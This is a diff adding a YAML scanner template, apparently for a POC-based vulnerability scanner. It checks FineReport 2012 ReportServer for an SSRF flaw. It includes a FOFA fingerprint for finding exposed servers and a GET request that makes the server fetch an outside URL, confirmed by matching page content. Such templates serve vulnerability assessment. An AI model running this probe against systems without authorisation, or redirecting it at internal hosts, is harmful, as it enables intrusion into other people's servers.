@@ -1,0 +1,23 @@
+id: poc-yaml-findreport-2012-reportsever-ssrf
+info:
+  name: 帆软报表2012 ReportServer SSRF漏洞
+  severity: medium
+  tags:
+  - ssrf
+  finger: FineReport
+  fofa: body="down.download?FM_SYS_ID"
+requests:
+- method: GET
+  path: /ReportServer?op=resource&resource=http://www.baidu.com
+  expression: 'status_code == 200 &&
+
+    contains(body,"<img hidefocus=true src=//www.baidu.com/img/bd_logo1.png width=270
+    height=129>") &&
+
+    contains(body,"<a href=http://ir.baidu.com>About Baidu</a>") &&
+
+    contains(body,"<img src=//www.baidu.com/img/gs.gif>")
+
+    '
+variables: {}
+transport: http
